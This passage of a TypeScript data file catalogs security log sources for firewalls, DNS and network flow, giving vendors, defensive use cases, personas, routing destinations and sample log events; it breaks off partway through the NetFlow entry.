// @ts-nocheck
export const dataSources = [
  {
    category: 'Firewalls',
    icon: '🛡️',
    sources: [
      {
        id: 'palo-alto-traffic',
        name: 'Palo Alto Traffic Logs',
        vendor: 'Palo Alto Networks',
        description: 'Firewall traffic logs capturing session-level network activity including source/destination, application identification, zone traversal, and policy actions.',
        status: 'available',
        useCases: ['Security Detection', 'NOC Troubleshooting', 'Policy Validation', 'Application Connectivity', 'Volume Anomaly Detection', 'Incident Investigation', 'Forensic Search'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'Platform Engineering', 'Incident Response', 'Compliance'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce firewall log field count by 35-45% for SIEM destinations while preserving all detection-required fields' },
            { persona: 'Team Leader', job: 'Demonstrate measurable SIEM ingestion cost savings within 30 days of dual-use routing implementation' },
            { persona: 'Data Engineer', job: 'Route full-fidelity logs to Lake at raw storage cost while sending optimized subsets to expensive analytics platforms' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 7+ detection alerts using pre-enriched fields without writing custom parsing logic' },
            { persona: 'Data End User / Analyst', job: 'Investigate denied traffic spikes and cross-zone anomalies using pre-built Cribl Search queries' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor interface traffic imbalance and session aging trends to detect routing issues before user impact' },
            { persona: 'Data End User / Analyst', job: 'Track application connectivity failures and bandwidth utilization across zones' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Get Palo Alto syslog traffic parsed and routed to SIEM + Lake within 30 minutes using pre-built pack functions' },
            { persona: 'Data Engineer', job: 'Configure multi-destination routing with per-destination field filtering in a single pipeline' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Google Chronicle', 'Microsoft Sentinel', 'Elastic Security', 'Dynatrace', 'Datadog', 'New Relic', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS)',
        sampleEvent: '<14>Sep 20 13:03:58 PA-VM 1,2025/09/20 13:03:58,44A1B3FC68F5304,TRAFFIC,end,2049,2025/09/20 13:03:58,34.217.108.226,10.0.0.102,34.217.108.226,10.0.2.65,splunk,,,incomplete,vsys1,untrusted,trusted,ethernet1/3,ethernet1/2,log-forwarding-default,2025/09/20 13:03:58,574326,1,53722,8088,53722,8088,0x400064,tcp,allow,296,296,0,4,2025/09/20 13:03:45,7,any,0,730277,0x0,United States,10.0.0.0-10.255.255.255,0,4,0,aged-out,0,0,0,0,,PA-VM,from-policy,,,0,,0,,N/A,0,0,0,0'
      },
      {
        id: 'zscaler-web-logs',
        name: 'Zscaler Internet Access (ZIA) Web Logs',
        vendor: 'Zscaler',
        description: 'Cloud proxy web transaction logs from Zscaler Internet Access capturing URL categorization, SSL inspection results, DLP policy actions, threat detection verdicts, user identity, and bandwidth consumption. Events delivered via Nanolog Streaming Service (NSS) in JSON or CEF format.',
        status: 'available',
        useCases: ['Data Exfiltration Detection', 'Malware Download Blocking', 'C2 Callback Detection', 'Shadow IT Discovery', 'Acceptable Use Policy Enforcement', 'SSL Inspection Bypass Monitoring', 'Bandwidth Abuse', 'User Risk Scoring', 'Compliance Reporting'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'Cloud Security', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress duplicate web transaction fields and reduce payload size by 40-50% before SIEM delivery' },
            { persona: 'Data Engineer', job: 'Split high-volume proxy logs into security-relevant (threats/blocks) for SIEM and full-fidelity for Lake, cutting SIEM cost by 60%' },
            { persona: 'Team Leader', job: 'Report monthly SIEM license savings from Zscaler log optimization with before/after GB comparison' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Create 5+ detection rules for C2 callbacks, data exfiltration patterns, and SSL inspection bypass attempts' },
            { persona: 'Data End User / Analyst', job: 'Identify shadow IT SaaS applications used by department with URL categorization and user identity correlation' },
            { persona: 'Jack of All Trades', job: 'Detect DLP policy violations and suspicious file downloads exceeding 100MB threshold per session' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Ensure 100% of web traffic logs are retained for 13 months in Lake to satisfy regulatory audit requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate acceptable use policy violation reports grouped by department and category within 5 minutes' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest Zscaler NSS JSON logs via HTTP source and normalize to common schema within 45 minutes' },
            { persona: 'Data Engineer', job: 'Enrich web logs with threat intelligence lookups and user department context before routing to destinations' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Nanolog Streaming Service (NSS → Syslog/TCP to Cribl) / Cloud NSS (HTTPS POST to Cribl HTTP source) / S3 Export',
        sampleEvent: '{"datetime":"2026-06-06T14:32:08.000Z","user":"jperks@cribl.io","department":"Customer Success","url":"https://drive.google.com/file/d/1a2b3c4d5e/view","hostname":"drive.google.com","action":"Allowed","urlcategory":"Cloud Storage","urlclass":"Business Use","dlpengine":"None","dlpdictionaries":"None","threatname":"None","threatclass":"None","deviceowner":"jperks","devicehostname":"LAPTOP-JP01","clientpublicIP":"203.0.113.42","clientprivateIP":"192.168.1.105","reqsize":1842,"respsize":34521,"contenttype":"text/html","reqmethod":"GET","respcode":"200","riskscore":0,"location":"Austin, TX","cloudname":"Zscaler Dallas","pagerisk":0,"malwarecategory":"None","malwareclass":"None","obfuscatedclientIP":"","obfuscatedcloudname":"","productversion":"6.2","rulelabel":"Default_Allow","ruletype":"FWD_RULE","sslinspection":"Yes","sslprotocol":"TLSv1.3"}'
      },
      {
        id: 'checkpoint-fw',
        name: 'Check Point Firewall & Threat Prevention',
        vendor: 'Check Point Software',
        description: 'Security gateway logs from Check Point Next-Generation Firewalls including traffic accept/drop/reject events, IPS blade detections, Anti-Bot verdicts, URL Filtering actions, Application Control decisions, Threat Emulation (sandboxing) results, and identity awareness events. Logs exported via Log Exporter (syslog/CEF/LEEF) or SmartConsole API.',
        status: 'available',
        useCases: ['Network Intrusion Detection', 'Bot Activity Blocking', 'Application Control', 'Threat Emulation (Sandboxing)', 'URL Filtering Enforcement', 'Zero-Day Protection', 'VPN Monitoring', 'Policy Compliance', 'DDoS Mitigation', 'Identity-Based Security'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'NOC', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Remove redundant blade-specific fields from unified logs, reducing event size by 30-40% for SIEM destinations' },
            { persona: 'Data Engineer', job: 'Route IPS/Anti-Bot/Threat Emulation alerts to SIEM at full fidelity while sending traffic accepts to Lake only' },
            { persona: 'Team Leader', job: 'Quantify per-blade log volume contribution and present optimization targets to reduce SIEM spend by 25%+' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules spanning IPS signatures, bot verdicts, and URL filtering blocks with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Correlate Threat Emulation sandboxing results with network connections to identify patient-zero hosts within minutes' },
            { persona: 'Jack of All Trades', job: 'Detect zero-day threats via Threat Emulation verdicts and correlate with identity-awareness user context' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track rule hit counts across security blades to identify misconfigured or overly permissive policies within 24 hours' },
            { persona: 'Data End User / Analyst', job: 'Monitor VPN tunnel stability and failover events to ensure <99.9% uptime SLA compliance' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain all firewall deny logs for 12+ months in immutable storage to meet PCI-DSS Section 10 requirements' },
            { persona: 'Data End User / Analyst', job: 'Produce audit-ready reports showing all policy changes and rule modifications within configurable time windows' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Log Exporter (Syslog CEF/LEEF/Splunk format) / SmartConsole Open Telemetry Export / OPSEC LEA / Check Point Harmony Connect',
        logFormat: 'CEF/LEEF syslog or semi-colon delimited. Key fields: action, src, dst, service, proto, rule, product (Firewall/IPS/Anti-Bot/URL Filtering/Threat Emulation), severity, confidence_level, protection_name, malware_family.',
        avgEPS: '5,000-100,000 EPS depending on gateway throughput and blade count',
        sampleEvent: 'CEF:0|Check Point|VPN-1 & FireWall-1|R82|Accept|5|act=Accept src=10.1.2.100 dst=203.0.113.50 spt=52341 dpt=443 proto=6 cs2=ethernet1/2 cs2Label=Interface Direction deviceDirection=0 cp_uuid=1a2b3c4d-e5f6-7890 rule_name="Allow-Outbound-HTTPS" product=Firewall layer_name="Network" match_id=15 parent_rule=0 rule_uid={AAAAAAAA-BBBB-CCCC} xlatesrc=198.51.100.10 xlatedst=203.0.113.50 NAT_rulenum=1 NAT_addtnl_rulenum=0 src_machine_name=WORKSTATION-01@CORP src_user_name=jperks@cribl.io identity_src=AD Query app_name=SSL_v3 app_category=Network_Protocols app_risk=1'
      },
      {
        id: 'cisco-asa',
        name: 'Cisco ASA / Firepower Threat Defense',
        vendor: 'Cisco',
        description: 'Firewall event logs from Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD). Captures connection build/teardown events (message IDs 302013-302016), denied traffic (106001-106023), NAT translations, VPN session events (713228, 722022), failover events, threat detection (IPS), and AMP file verdicts. Events delivered as syslog in Cisco-specific format with numeric message IDs.',
        status: 'available',
        useCases: ['Connection Monitoring', 'Denied Traffic Analysis', 'VPN Session Tracking', 'NAT Translation Issues', 'Failover Monitoring', 'Threat Detection (IPS)', 'ACL Hit Counts', 'Botnet Filtering', 'Identity Firewall', 'Site-to-Site VPN Health'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'NOC', 'Network Engineering', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume connection build/teardown events (302013-302016) to summary records, reducing SIEM volume by 50-70%' },
            { persona: 'Data Engineer', job: 'Route verbose informational syslog (severity 6-7) to Lake while forwarding only security-relevant events (severity 1-4) to SIEM' },
            { persona: 'Team Leader', job: 'Present quarterly cost avoidance metrics showing dollars saved per ASA/FTD appliance from log optimization' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for denied traffic patterns (106xxx), VPN brute force (722xxx), and ACL bypass attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate VPN session anomalies including impossible travel and concurrent session abuse across gateways' },
            { persona: 'Jack of All Trades', job: 'Correlate NAT translation failures with denied traffic to identify misconfigured access policies within 15 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor failover events and connection table exhaustion trends to prevent outages with 30-minute advance warning' },
            { persona: 'Data End User / Analyst', job: 'Track AnyConnect VPN session counts and bandwidth by gateway to right-size infrastructure capacity' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Parse Cisco ASA syslog message IDs into structured fields and route to SIEM + Lake within 20 minutes using pre-built packs' },
            { persona: 'Data Engineer', job: 'Normalize ASA and FTD events into a common firewall schema for cross-vendor correlation in downstream analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS) / NSEL (NetFlow Security Event Logging) / Cisco FMC eStreamer / Cisco SecureX integration',
        logFormat: 'Cisco syslog format: %ASA-severity-message_id: message_text. Key message IDs: 302013/302014 (TCP build/teardown), 302015/302016 (UDP), 106001-106023 (denied), 713228 (IKE), 722022-722051 (AnyConnect). Severity 1-7.',
        avgEPS: '5,000-200,000 EPS depending on throughput and logging level',
        sampleEvent: 'Jun 06 14:32:08 ASA-01 : %ASA-6-302013: Built inbound TCP connection 574326 for outside:203.0.113.42/52341 (203.0.113.42/52341) to inside:10.1.2.100/443 (198.51.100.10/443) duration 0:00:07 bytes 15234 TCP FINs\nJun 06 14:32:09 ASA-01 : %ASA-4-106023: Deny tcp src outside:203.0.113.99/44521 dst inside:10.1.2.50/22 by access-group "outside_in" [0x0, 0x0]\nJun 06 14:32:10 ASA-01 : %ASA-6-722022: Group <VPN-Users> User <jperks> IP <203.0.113.42> SVC Message: Connection established with server 198.51.100.1.'
      }
    ]
  },
  {
    category: 'DNS',
    icon: '🌐',
    sources: [
      {
        id: 'windows-dns',
        name: 'Windows DNS Server Logs',
        vendor: 'Microsoft',
        description: 'DNS query and response logs from Windows DNS Server via Analytical ETW channel (Event IDs 256-292) and legacy debug logging. Captures client queries, responses, recursion, zone transfers, and policy actions.',
        status: 'available',
        useCases: ['DNS Tunneling Detection', 'DGA Detection', 'Malware C2 Callbacks', 'Zone Transfer Reconnaissance', 'Resolver Health', 'Query Latency Monitoring', 'NXDOMAIN Spikes', 'Top Talker Analysis', 'DNS Policy Enforcement'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'SRE', 'Active Directory Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 5+ detection rules for DNS tunneling, DGA patterns, and NXDOMAIN spikes with <5 minute alert latency' },
            { persona: 'Data End User / Analyst', job: 'Hunt for C2 callback patterns by correlating high-entropy domain queries with known threat intelligence feeds' },
            { persona: 'Jack of All Trades', job: 'Detect zone transfer attempts and unauthorized recursive queries from non-sanctioned clients' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate repetitive DNS queries (PTR lookups, health checks) reducing log volume by 60-75% without losing unique query visibility' },
            { persona: 'Data Engineer', job: 'Route only NXDOMAIN, blocked, and high-entropy queries to SIEM while sending full query logs to Lake for forensic search' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor DNS resolver latency and query failure rates to detect infrastructure degradation within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Identify top-talking clients and query patterns causing resolver load spikes during business hours' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Collect Windows DNS analytical ETW events via Cribl Edge and deliver parsed records to SIEM within 30 minutes of deployment' },
            { persona: 'Platform Administrator', job: 'Configure Edge collection across 50+ DNS servers with centralized fleet management and health monitoring' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / WEF / File Monitor (dns.log)',
        sampleEvent: '6/6/2026 8:15:32 AM 0E64 PACKET  00000000040DBE50 UDP Rcv 192.168.1.105   b4c2   Q [0001   D   NOERROR] A      (7)finance(3)corp(5)local(0)'
      },
      {
        id: 'infoblox-dns',
        name: 'Infoblox DNS Query Logs',
        vendor: 'Infoblox',
        description: 'DNS query and response logs from Infoblox NIOS appliances and BloxOne DDI. Captures client queries, recursive resolution, RPZ (Response Policy Zone) actions, DHCP-to-DNS correlation, and DNS security events including tunneling detection and DGA indicators via Infoblox Threat Defense.',
        status: 'available',
        useCases: ['DNS Tunneling Detection', 'DGA Detection', 'Malware C2 Callbacks', 'RPZ Block Monitoring', 'Resolver Health', 'Query Latency Monitoring', 'NXDOMAIN Spikes', 'Top Talker Analysis', 'DHCP-DNS Correlation', 'Cache Poisoning Detection'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'SRE', 'Network Engineering', 'DDI Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build RPZ block correlation rules that map blocked domains to originating clients and generate incident tickets within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Investigate DNS tunneling alerts using query length entropy analysis and subdomain frequency patterns' },
            { persona: 'Jack of All Trades', job: 'Correlate Infoblox Threat Defense DGA indicators with endpoint process execution to identify compromised hosts' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress recursive resolution internal chatter and health-check queries, reducing DNS log volume by 55-70% for SIEM' },
            { persona: 'Data Engineer', job: 'Route RPZ hits and security events to SIEM while directing full query/response pairs to Lake for long-term forensics' },
            { persona: 'Team Leader', job: 'Demonstrate 50%+ DNS log cost reduction while maintaining full detection coverage for audit review' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor DHCP-DNS correlation gaps and detect stale PTR records causing resolution failures across 500+ subnets' },
            { persona: 'Data End User / Analyst', job: 'Track resolver cache hit ratios and query latency percentiles to maintain sub-50ms p95 response time' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest Infoblox NIOS syslog and BloxOne Data Connector feeds into unified pipeline within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Infoblox DNS events to common DNS schema for cross-vendor correlation with Windows DNS and Umbrella' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS from NIOS) / Infoblox Data Connector (BloxOne → S3/HTTP) / SNMP Traps (for RPZ hits)',
        sampleEvent: '06-Jun-2026 14:32:08.123 client 192.168.1.105#54321 (finance.corp.local): query: finance.corp.local IN A + (10.0.1.53)\n06-Jun-2026 14:32:08.456 rpz QNAME NXDOMAIN rewrite finance.corp.local/A/IN via finance.corp.local.rpz-nxdomain.malware-block.local [policy: Malware-Block-Policy]\n06-Jun-2026 14:32:09.789 queries: info: client @0x7f8a1c002340 192.168.1.105#54321 (suspicious-domain.xyz): query: suspicious-domain.xyz IN A -EDC (10.0.1.53)'
      },
      {
        id: 'cisco-umbrella',
        name: 'Cisco Umbrella DNS & Proxy Logs',
        vendor: 'Cisco',
        description: 'Cloud-delivered DNS security and secure web gateway logs from Cisco Umbrella (formerly OpenDNS). Captures DNS query decisions (allowed/blocked/proxied), intelligent proxy inspection results, URL categorization, file inspection verdicts (AMP), DLP matches, cloud firewall events, and identity-based policy actions. Logs delivered via S3 export or Managed S3 bucket integration.',
        status: 'available',
        useCases: ['DNS Tunneling Detection', 'DGA Domain Blocking', 'Malware C2 Callback Prevention', 'Phishing Domain Blocking', 'Shadow IT Discovery', 'Cryptomining Detection', 'Content Category Enforcement', 'Data Loss Prevention', 'Roaming Client Visibility', 'Selective Proxy Inspection'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'NOC', 'Cloud Security', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for DGA blocking, cryptomining callbacks, phishing domains, and newly seen domain anomalies' },
            { persona: 'Data End User / Analyst', job: 'Investigate blocked DNS queries by correlating Umbrella decisions with endpoint identity and roaming client location' },
            { persona: 'Jack of All Trades', job: 'Identify selective proxy bypass patterns indicating evasion attempts against DNS-layer security controls' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter allowed queries to known-good domains (CDNs, internal) reducing SIEM ingest by 65-80% while keeping all blocked/proxied events' },
            { persona: 'Data Engineer', job: 'Consolidate DNS, proxy, IP, and CDR log types into unified pipeline with per-type routing and field optimization' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all blocked and proxied requests for 12+ months to satisfy compliance review requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate content category enforcement reports showing policy violations by user group within 10 minutes' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure S3 Collector to ingest Umbrella CSV exports with automatic schema detection and field mapping within 30 minutes' },
            { persona: 'Data Engineer', job: 'Parse multi-format Umbrella logs (DNS CSV, proxy CSV, IP logs) into normalized schema for unified security analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cisco Umbrella S3 Log Export (Cribl S3 Collector) / Managed S3 bucket / Umbrella Reporting API / Syslog (via Log Management integration)',
        logFormat: 'CSV (S3 export) with multiple log types: dnslogs (DNS queries), proxylogs (intelligent proxy), iplogs (cloud firewall), cdrlogs (cloud delivered firewall). Key fields: Timestamp, InternalIp, ExternalIp, Action, QueryType, Domain, Categories, PolicyIdentity, Verdict.',
        avgEPS: '5,000-100,000 EPS depending on user population and DNS query volume',
        sampleEvent: '"2026-06-06 14:32:08","jperks@cribl.io","LAPTOP-JP01","10.1.2.100","203.0.113.42","Allowed","A","suspicious-domain.xyz","Malware,Newly Seen Domains","Cribl-Prod-Policy","DNS","","","","198.51.100.1","","","","low"'
      },
      {
  id: 'azure-dns',
  name: 'Azure DNS Analytics & Query Logs',
  vendor: 'Microsoft',
  description: 'DNS query logs and analytics from Azure DNS public zones and Azure DNS Private Resolver. Captures resolution requests, response codes, query types, and client metadata via Azure Monitor Diagnostic Settings. Provides visibility into DNS-based threats, misconfigurations, and traffic patterns across Azure-hosted workloads.',
  status: 'available',
  useCases: [
    'DNS tunneling and exfiltration detection',
    'DGA (Domain Generation Algorithm) domain identification',
    'Shadow IT discovery via unexpected DNS resolutions',
    'DNS query volume anomaly detection',
    'Private zone resolution auditing for compliance',
    'Stale or orphaned DNS record identification',
    'Query latency and failure rate monitoring',
    'Cross-tenant DNS resolution tracking'
  ],
  personas: ['Security Analyst', 'SOC Engineer', 'Cloud Infrastructure Engineer', 'Network Operations'],
  jobsToBeDone: [
    {
      category: 'Security Detection',
      jobs: [
        'Detect DNS tunneling by identifying high-entropy query names and abnormal TXT record volumes',
        'Flag queries to known malicious domains or newly registered domains indicative of DGA activity',
        'Identify data exfiltration attempts via encoded subdomains exceeding normal label lengths',
        'Alert on DNS rebinding attacks targeting internal Azure Private DNS zones',
        'Correlate NXDOMAIN spikes with potential reconnaissance or misconfigured malware callbacks'
      ]
    },
    {
      category: 'Cost Optimization',
      jobs: [
        'Reduce SIEM ingestion costs by filtering repetitive health-check DNS queries before forwarding',
        'Deduplicate high-frequency recursive resolution logs from Azure Private Resolver',
        'Route low-value DNS analytics to cold storage while sending security-relevant queries to SIEM',
        'Identify and suppress noisy internal service discovery queries that inflate log volume',
        'Summarize DNS query patterns into aggregated metrics to replace verbose raw logs'
      ]
    },
    {
      category: 'Operational Visibility',
      jobs: [
        'Monitor DNS resolution failure rates across Azure regions and virtual networks',
        'Track query volume trends to capacity-plan Azure DNS Private Resolver endpoints',
        'Identify misconfigured conditional forwarders causing resolution loops or timeouts',
        'Audit private zone record usage to detect stale entries and reduce zone sprawl',
        'Correlate DNS query spikes with application deployment events or outages'
      ]
    },
    {
      category: 'Data Onboarding',
      jobs: [
        'Normalize AzureDiagnostics DNS records into a common DNS schema for multi-cloud correlation',
        'Enrich DNS logs with Azure resource metadata including subscription, resource group, and virtual network',
        'Parse resource-specific DNS query logs and map response codes to human-readable status values',
        'Route DNS security events to SIEM and operational metrics to monitoring platforms simultaneously',
        'Transform Azure Monitor JSON payloads into destination-native formats for Splunk CIM or Elastic ECS compliance'
      ]
    }
  ],
  criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
  destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
  collectionMethod: 'Azure Event Hub (recommended) or Azure Blob Storage via Azure Monitor Diagnostic Settings. Configure diagnostic settings on DNS Private Resolver or public DNS zones to export DnsQueryLogs and DNS Analytics categories. Cribl Stream ingests via the Azure Event Hub source or Azure Blob Storage source with JSON array parsing enabled.',
  sampleEvent: '{"time":"2026-06-29T14:32:07.182Z","resourceId":"/SUBSCRIPTIONS/A1B2C3D4-E5F6-7890-ABCD-EF1234567890/RESOURCEGROUPS/RG-NETWORKING/PROVIDERS/MICROSOFT.NETWORK/DNSRESOLVERPOLICIES/POLICY-PROD-EASTUS","operationName":"Microsoft.Network/dnsResolverPolicies/dnsQueryLog","category":"DnsQueryLogs","properties":{"queryName":"api.internal.contoso.com.","queryType":"A","responseCode":"NOERROR","clientIP":"10.42.3.117","virtualNetworkId":"/subscriptions/a1b2c3d4-e5f6-7890-abcd-ef1234567890/resourceGroups/rg-networking/providers/Microsoft.Network/virtualNetworks/vnet-prod-eastus","protocol":"UDP","queryClass":"IN","responseTtl":300,"dnsResolverPolicyName":"policy-prod-eastus","ruleName":"forward-internal"}}'
},
      {
  id: 'bluecat-dns',
  name: 'BlueCat DNS Edge & Integrity Logs',
  vendor: 'BlueCat',
  description: 'Collects DNS query logs, DHCP lease events, and policy enforcement actions from BlueCat Integrity (Address Manager / BDDS) and BlueCat Edge service points. Provides visibility into internal DNS resolution patterns, namespace-aware routing decisions, threat feed block/redirect actions, and client-to-IP mappings for asset enrichment and lateral movement detection.',
  status: 'available',
  useCases: [
    'DNS threat detection and response',
    'DNS tunneling and exfiltration identification',
    'Internal asset discovery via DHCP/IPAM correlation',
    'Policy enforcement audit and compliance',
    'Namespace-aware traffic analysis',
    'Shadow IT and unauthorized SaaS detection',
    'DNS query volume optimization and cost reduction',
    'Incident response enrichment with client-to-IP mapping'
  ],
  personas: ['Security Analyst', 'Network Engineer', 'SOC Analyst', 'IT Operations', 'Platform Engineer'],
  jobsToBeDone: [
    {
      category: 'Security Detection',
      jobs: [
        'Detect DNS tunneling via high-entropy subdomain queries and abnormal TXT record volumes',
        'Identify DGA (Domain Generation Algorithm) callbacks by correlating query patterns against threat intelligence feeds',
        'Alert on policy bypass attempts where clients resolve blocked domains through alternate resolvers',
        'Detect lateral movement by correlating DHCP lease changes with anomalous DNS resolution patterns',
        'Identify data exfiltration via DNS by monitoring query length distributions and NXDOMAIN ratios',
        'Surface unauthorized namespace resolution indicating split-horizon policy violations'
      ]
    },
    {
      category: 'Cost Optimization',
      jobs: [
        'Reduce SIEM ingest costs by filtering repetitive PTR lookups and health-check DNS noise before forwarding',
        'Identify high-volume internal DNS chatterers generating unnecessary query load for tuning or suppression',
        'Deduplicate Edge service point logs when multiple points report the same resolution chain',
        'Route low-value DHCP lease renewal events to cold storage while forwarding only new assignments to SIEM',
        'Quantify DNS query volume per business unit to enable chargeback or rightsizing discussions'
      ]
    },
    {
      category: 'Operational Visibility',
      jobs: [
        'Monitor DNS resolution latency across Edge service points to detect upstream resolver degradation',
        'Track DHCP pool utilization and forecast address exhaustion across managed scopes',
        'Audit namespace delegation changes and zone transfer activity for change management compliance',
        'Correlate DNS SERVFAIL and REFUSED responses with application availability incidents',
        'Map client device DNS behavior to identify misconfigured or rogue DNS resolver usage',
        'Baseline DNS query patterns per namespace to detect configuration drift after maintenance windows'
      ]
    },
    {
      category: 'Data Onboarding',
      jobs: [
        'Normalize BlueCat syslog (BDDS) and Edge webhook/API formats into a unified DNS schema',
        'Enrich DNS events with IPAM metadata (network, location, device name) from Address Manager exports',
        'Parse BlueCat Edge policy action fields to extract threat category, feed source, and enforcement decision',
        'Convert BlueCat timestamp formats and correlate Edge cloud timestamps with on-prem BDDS syslog times',
        'Route DNS security events to SIEM and operational DNS metrics to observability platforms simultaneously'
      ]
    }
  ],
  criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
  destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
  collectionMethod: 'Syslog (TCP/UDP/TLS) from BlueCat DNS/DHCP Server (BDDS) appliances; REST API polling or webhook receiver for BlueCat Edge cloud service points; optional S3 import for Edge batch exports. Cribl Edge can be deployed as a local collector on the same network segment as BDDS for reliable UDP syslog capture with automatic source identification.',
  sampleEvent: '<134>1 2026-06-29T14:32:07.891Z bdds01.corp.internal named-query 12847 - - client @0x7f2a1c003a80 10.42.18.55#52341 (edge-config.bluecat.io): query: edge-config.bluecat.io IN A + (10.42.1.10); policy: PASSTHRU; namespace: internal-corp; view: corporate-resolvers; response: NOERROR; rdata: 104.18.22.47; elapsed_ms: 2; feed_match: none; edge_sp: sp-us-east-1a'
}
    ]
  },
  {
    category: 'Network Flow',
    icon: '🔀',
    sources: [
      {
        id: 'netflow',
        name: 'NetFlow (v5/v9)',
        vendor: 'Cisco / Multiple',
        description: 'Network flow telemetry via Cisco NetFlow v5 and v9 protocols. Captures unidirectional flow records with source/destination IPs, ports, protocol, byte/packet counts, TCP flags, ToS/DSCP markings, AS numbers, and interface indexes. NetFlow v9 adds template-based extensibility for MPLS labels, IPv6, and custom fields. Primary source for network traffic analysis without full packet capture.',
        status: 'available',
